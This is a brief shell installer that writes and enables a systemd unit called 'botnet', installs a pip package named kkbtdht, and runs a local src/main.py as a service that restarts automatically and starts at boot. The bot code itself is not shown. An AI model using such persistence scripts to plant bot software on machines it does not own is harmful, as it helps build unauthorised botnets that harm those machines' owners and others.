#!/bin/sh

sudo touch /etc/systemd/system/botnet.service;
cfg="[Unit]
Description=botnet
After=network.target

[Service]
User='$(whoami)'
Group='$(id -g)'
WorkingDirectory='$(pwd)'
ExecStart=/usr/bin/python3 $(pwd)/src/main.py
TimeoutSec=30
Restart=always

[Install]
WantedBy=multi-user.target"

sudo apt install python3-pip
sudo pip install kkbtdht

sudo bash -c "echo '$cfg' > /etc/systemd/system/botnet.service";
echo "$cfg"
sudo systemctl enable botnet
sudo systemctl start botnet
